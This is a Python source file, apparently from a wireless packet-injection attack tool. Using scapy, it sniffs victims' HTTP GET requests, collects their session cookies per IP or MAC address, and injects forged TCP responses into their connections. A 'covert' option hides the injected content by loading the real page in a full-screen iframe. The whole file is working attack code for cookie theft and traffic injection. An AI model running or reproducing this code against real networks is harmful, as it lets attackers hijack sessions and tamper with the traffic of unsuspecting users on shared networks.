from lib.injector import Injector
from lib.victim import Victim
from scapy.all import *
import socket

## Originally in injector.py and imported via *
global BLOCK_HOSTS
BLOCK_HOSTS = set()

### Verify these can be removed
#global npackets
#npackets = 0


class PacketHandler(object):
    """This class does all the heavy-lifting.

    It has an optional Victims parameter that is a 
    List of instances of Victims for targeted mode.
    
    It can also be fed an instance of VictimParameters
    directly if working in broadcast mode and attacking all clients.
    """

    def __init__(self, *positional_parameters, **keyword_parameters):
        if ('victims' in keyword_parameters):
            self.victims=keyword_parameters['victims']
        else:
            self.victims = []

        if ('excluded' in keyword_parameters):
            self.excluded = self.proc_excluded(keyword_parameters['excluded'])
        else:
            self.excluded = None

        if ('handler' in keyword_parameters):
            self.handler = keyword_parameters['handler']
        else:
            self.handler = None

        if ('i' in keyword_parameters):
            self.i = keyword_parameters['i']
        else:
            self.i = None

        if ('victim_parameters' in keyword_parameters):
            self.victim_parameters = keyword_parameters['victim_parameters']
        else:
            self.victim_parameters = None

        if (self.i is None):
            print "[ERROR] No injection interface selected"
            exit(1)

        if (len(self.victims) == 0 and self.victim_parameters is None):
            print "[ERROR] Please specify victim parameters or Victim List"
            exit(1)

        self.newvictims = []
        #newvictims = []
        self.injector=Injector(self.i)
        #injector = Injector(self.i)


    ###
    def proc_excluded(self, excluded):
        """Check if argument provided in excluded is an ip.
        
        If it's not, dns resolve it and add those IPs to the exclude list.
        """
        processed = set()
        for item in excluded:
            try:
                test = item.split(".")
                if (len(test) != 4):
                    try:
                        processed.add(socket.gethostbyname(item))
                    except:
                        pass

                ### Clean this nest
                else:
                    try:
                        if (int(test[0])>0 and int(test[0]) < 256):
                            if (int(test[0])>0 and int(test[0]) < 256):
                                if (int(test[0])>0 and int(test[0]) < 256):
                                    if (int(test[0])>0 and int(test[0]) < 256):
                                        processed.add(item)

                    except:
                        processed.add(socket.gethostbyname(item))

            except:
                try:
                    processed.add(socket.gethostbyname(item))
                except:
                    pass

        return processed


    def search_cookie(self, ret2):
        """Looks for cookie in string returned by PacketHandler.get_request().
        
        Returns a List object [host, cookie] if there is one, otherwise returns None.
        """
        if (len(ret2.strip()) > 0):
            arr = ret2.split("\n")
            #print ret2
            host = ""
            cookie = ""
            for line in arr:
                if ('Cookie' in line):
                    cookie = line.strip()

                if ('Host' in line):
                    host = line.split()[1].strip()

            if (len(host) != 0 and len(cookie) != 0):
                return [host, cookie]
            else:
                if (len(host) > 0):
                    return (host, None)
                else:
                    return None

        else:
            return None


    def get_request(self, pkt):
        """Extracts request payload as a string from the packet object
        if there is a payload, otherwise returns None.
        """
        ### This is where we can see the return from the server for the Domain=
        ### Needed for extract_cookies() in logger.py
        #print pkt.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}")
        
        ret2 = "\n".join(pkt.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
        if (len(ret2.strip()) > 0):
            return ret2.translate(None, "'").strip()
        else:
            return None


    def handle_default(self, packet, single):
        """Default packet handler, looks for GET requests in the TCP layer."""
        if (packet.haslayer(IP) and packet.haslayer(TCP)):
            ## MONITOR MODE
            if (packet.haslayer(Dot11) and not packet.haslayer(Ether)):
                vicmac = packet.getlayer(Dot11).addr2
                rtrmac = packet.getlayer(Dot11).addr1

            ## TAP MODE
            else:
                vicmac = packet.getlayer(Ether).src
                rtrmac = packet.getlayer(Ether).dst

            vicip = packet.getlayer(IP).src
            svrip = packet.getlayer(IP).dst
            vicport = packet.getlayer(TCP).sport
            svrport = packet.getlayer(TCP).dport
            size = len(packet.getlayer(TCP).load)
            acknum = str(int(packet.getlayer(TCP).seq) + size)
            seqnum = packet.getlayer(TCP).ack
            request = self.get_request(packet)
            global BLOCK_HOSTS
            for obj in BLOCK_HOSTS:
                ip, seq = obj
                if (svrip == ip and seqnum != seq):
                    #print "REMOVING ", svrip
                    for obj2 in BLOCK_HOSTS:
                        ip2, seq2 = obj2
                        if (ip2 == svrip):
                            BLOCK_HOSTS.remove((ip2, seq2))

            ## Look for desired plaintext here
            #print request
            if 'GET /' in request:
                pass
            else:
                return 0
            #print BLOCK_HOSTS
            #print request

            ### Perhaps do the Victim removal from single list here?
            ### No idea yet, still tracing code and deciding..
            ### Leaving single code for now
            if single:
                try:
                    TSVal, TSecr = packet.getlayer(TCP).options[2][1]
                except:
                    TSVal = None
                    TSecr = None

                cookie = self.search_cookie(request)
                #print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie)
                return (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
            else:
                try:
                    TSVal, TSecr = packet.getlayer(TCP).options[2][1]
                except:
                    TSVal = None
                    TSecr = None

                cookie = self.search_cookie(request)
                #print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie)
                return (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
        return None


    def cookie_mgmt(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, args):
        """This function does cookie management for broadcast mode and targeted mode.

        A new mode is also added that can work in both broadcast
        added that if VictimParameters is set, it also performs a broadcast attack.
        """
        if (len(self.victims) == 0):
            try:
                k = cookie[1]
            except:
                cookie = ["NONE", "NONE"]

            if (cookie[1] is not None):
                exists = 0
                for victim in self.newvictims:
                    if (victim.ip is not None):
                        if (victim.ip == vicip):
                            victim.add_cookie(cookie, args)
                            exists = 1

                    else:
                        if (victim.mac is not None):
                            if (victim.mac.lower() == vicmac.lower()):
                                victim.add_cookie(cookie, args)
                                exists = 1

                if (exists == 0):
                    #print "here"
                    v1 = Victim(ip = vicip, mac = vicmac, victim_parameters = self.victim_parameters)
                    v1.add_cookie(cookie, args)
                    self.newvictims.append(v1)

            else:
                if (cookie[0] is not None and cookie[1] is None):
                    #print bcolors.WARNING + "[!] No cookie found for", cookie[0] + bcolors.ENDC
                    newcookie = [cookie[0], "NONE"]
                    cookie = newcookie
                    for victim in self.newvictims:
                        if (victim.ip is not None):
                            if (victim.ip == vicip):
                                victim.add_cookie(cookie, args)

                        else:
                            if (victim.mac is not None):
                                if (victim.mac.lower() == vicmac.lower()):
                                    victim.add_cookie(cookie, args)

                exists = 0
                for victim in self.newvictims:
                    if (victim.ip is not None):
                        if (victim.ip == vicip):
                            exists = 1

                    else:
                        if (victim.mac is not None):
                            if (victim.mac.lower() == vicmac.lower()):
                                exists = 1

                if (exists == 0):
                    v1 = Victim(ip = vicip, mac = vicmac, victim_parameters = self.victim_parameters)
                    self.newvictims.append(v1)

        else:
            vic_in_targets = 0
            try:
                k = cookie[1]
            except:
                try:
                    k = cookie[0]
                    cookie[1] = "NONE"
                except:
                    cookie = ["NONE", "NONE"]

            if (cookie[1] is not None):
                for victim in self.victims:
                    if (victim.ip is not None):
                        if (victim.ip == vicip):
                            vic_in_targets = 1
                            victim.add_cookie(cookie, args)

                    else:
                        if (victim.mac is not None):
                            if (victim.mac.lower() == vicmac.lower()):
                                vic_in_targets = 1
                                victim.add_cookie(cookie, args)

            else:
                if (cookie[0] is not None and cookie[1] is None):
                    #print bcolors.WARNING + "[!] Victim ", vicmac, "cookie not found for website", cookie[0] + bcolors.ENDC
                    newcookie = [cookie[0], "NONE"]
                    cookie = newcookie
                    for victim in self.victims:
                        if (victim.ip is not None):
                            if (victim.ip == vicip):
                                vic_in_targets = 1
                                victim.add_cookie(cookie, args)

                        else:
                            if (victim.mac is not None):
                                if (victim.mac.lower() == vicmac.lower()):
                                    victim.add_cookie(cookie, args)
                                    vic_in_targets = 1

            ## IF VIC IS IN TARGETS, RETURN
            if (vic_in_targets == 1):
                return

            ### Should we else this?
            ##ELSE, PROCEED IF VICTIM_PARAMETERS IS SET
            if (self.victim_parameters is not None):
                try:
                    k = cookie[1]
                except:
                    #print cookie
                    cookie = ["NONE", "NONE"]
                if (cookie[1] is not None):
                    exists = 0
                    for victim in self.newvictims:
                        if (victim.ip is not None):
                            if (victim.ip == vicip):
                                victim.add_cookie(cookie, args)
                                exists = 1

                        else:
                            if (victim.mac is not None):
                                if (victim.mac.lower() == vicmac.lower()):
                                    victim.add_cookie(cookie, args)
                                    exists = 1

                    if (exists == 0):
                        #print "here"
                        v1 = Victim(ip = vicip, mac = vicmac, victim_parameters = self.victim_parameters)
                        v1.add_cookie(cookie, args)
                        self.newvictims.append(v1)

                else:
                    if (cookie[0] is not None and cookie[1] is None):
                        #print bcolors.WARNING + "[!] No cookie found for", cookie[0] + bcolors.ENDC
                        newcookie = [cookie[0], "NONE"]
                        cookie = newcookie
                        for victim in self.newvictims:
                            if (victim.ip is not None):
                                if (victim.ip == vicip):
                                    victim.add_cookie(cookie, args)

                            else:
                                if (victim.mac is not None):
                                    if (victim.mac.lower() == vicmac.lower()):
                                        victim.add_cookie(cookie, args)

                    exists = 0
                    for victim in self.newvictims:
                        if (victim.ip is not None):
                            if (victim.ip == vicip):
                                exists = 1

                        else:
                            if (victim.mac is not None):
                                if (victim.mac.lower() == vicmac.lower()):
                                    exists = 1

                    if (exists == 0):
                        v1 = Victim(ip = vicip, mac = vicmac, victim_parameters = self.victim_parameters)
                        self.newvictims.append(v1)


    def covert_injection(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection):
        global BLOCK_HOSTS
        #print svrip,BLOCK_HOSTS
        for obj in BLOCK_HOSTS:
            ip, seq = obj
            if (svrip == ip):
                return 0

        BLOCK_HOSTS.add((svrip, seqnum))
        #print BLOCK_HOSTS
        req = request.split("\n")
        filename = ""
        host = ""
        for line in req:
            if ("GET" in line):
                filename = line.split()[1].strip()

            if ("Host" in line):
                host = line.split()[1].strip()

        if (len(host) > 0 and len(filename) > 0):
            injection += """ <body style="margin:0px;padding:0px;overflow:hidden">"""
            injection += """ <iframe src=" """
            if (host in filename):
                injection += "http://" + filename[1:]

            else:
                injection += "http://" + host + filename
                injection += """ " frameborder="0" style="overflow:hidden;overflow-x:hidden;overflow-y:hidden;height:100%;width:100%;position:absolute;top:0px;left:0px;right:0px;bottom:0px" height="100%" width="100%"></iframe> """
                injection += "</body>"
        #print injection
        return injection


    def proc_injection(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, single):
        """Process injection function using the PacketHandler.victims List.
        
        If it was set, to check if the packet belongs to any of the targets.
        If no victims List is set, meaning it's in broadcast mode, it checks
        for the victim in PacketHandler.newvictims and gets the injection for it,
        if there is one, and injects it via Injector.inject().
        """
        if (len(self.victims) == 0):
            if (self.victim_parameters.in_request is not None):
                result = self.victim_parameters.proc_in_request(request)
                #print result
                if (not result):
                    return 0

            if (self.excluded is not None):
                if (svrip in self.excluded):
                    return 0

            ### Clean this nest
            for victim in self.newvictims:
                if (victim.ip is not None):
                    if (victim.ip == vicip):
                        injection = victim.get_injection()
                        if (injection is not None):
                            if (victim.victim_parameters.covert):
                                cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
                                if (cov_injection != 0):
                                    injection = cov_injection

                                else:
                                    return 0

                            #print injection
                            ### Broadcast injector is here
                            #self.Injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, single)
                            self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, single)

                else:
                    if (victim.mac is not None):
                        if (victim.mac.lower() == vicmac.lower()):
                            injection = victim.get_injection()
                            if (injection is not None):
                                if (victim.victim_parameters.covert):
                                    cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
                                    if (cov_injection != 0):
                                        injection=cov_injection

                                    else:
                                        return 0
                                #print injection
                                #self.Injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr)
                                self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr)

        else:
            if (self.victim_parameters is not None):
                if (self.victim_parameters.in_request is not None):
                    result = self.victim_parameters.proc_in_request(request)
                    #print result
                    if (not result):
                        return 0

                if (self.excluded is not None):
                    if (svrip in self.excluded):
                        return 0

                ### Clean this nest
                for victim in self.newvictims:
                    if (victim.ip is not None):
                        if (victim.ip == vicip):
                            injection = victim.get_injection()
                            if (injection is not None):
                                if (victim.victim_parameters.covert):
                                    cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
                                    if (cov_injection != 0):
                                        injection = cov_injection

                                    else:
                                        return 0

                                #print injection
                                #self.Injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr)
                                self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr)

                    else:
                        if (victim.mac is not None):
                            if (victim.mac.lower() == vicmac.lower()):
                                injection = victim.get_injection()
                                if (injection is not None):
                                    if (victim.victim_parameters.covert):
                                        cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
                                        if (cov_injection != 0):
                                            injection = cov_injection

                                        else:
                                            return 0

                                    #print injection
                                    #self.Injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr)
                                    self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr)

            if (self.excluded is not None):
                if (svrip in self.excluded):
                    return 0

            for victim in self.victims:
                if (victim.ip is not None):
                    if (victim.ip == vicip):
                        if (victim.victim_parameters.in_request is not None):
                            result=victim.victim_parameters.proc_in_request(request)
                            if (not result):
                                return 0

                        injection = victim.get_injection()
                        if (injection is not None):
                            #print vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection
                            if (victim.victim_parameters.covert):
                                cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
                                if (cov_injection != 0):
                                    injection = cov_injection

                                else:
                                    return 0

                            #print injection
                            #self.Injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr)
                            self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr)

                else:
                    if (victim.mac is not None):
                        if (victim.mac.lower() == vicmac.lower()):
                            if (victim.victim_parameters.in_request is not None):
                                result = victim.victim_parameters.proc_in_request(request)
                                if (not result):
                                    return 0

                            injection = victim.get_injection()
                            if (injection is not None):
                                if (victim.victim_parameters.covert):
                                    cov_injection = self.covert_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, injection)
                                    if (cov_injection != 0):
                                        injection=cov_injection

                                    else:
                                        return 0

                                #print injection
                                #print host, filename
                                #self.Injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr)
                                self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr)


    def process(self, interface, pkt, single, args):
        """Process packets coming from the sniffer.
        
        You can override the handler with one of your own,
        that you can use for any other packet type (e.g DNS),
        otherwise it uses the default packet handler looking
        for GET requests for injection and cookies.
        """
        ## You can write your own handler for packets
        if (self.handler is not None):
            self.handler(interface, pkt)
        else:
            #ls(pkt)
            try:
                vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr = self.handle_default(pkt, single)
                self.cookie_mgmt(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, args)
                self.proc_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, single)
            except:
                return
 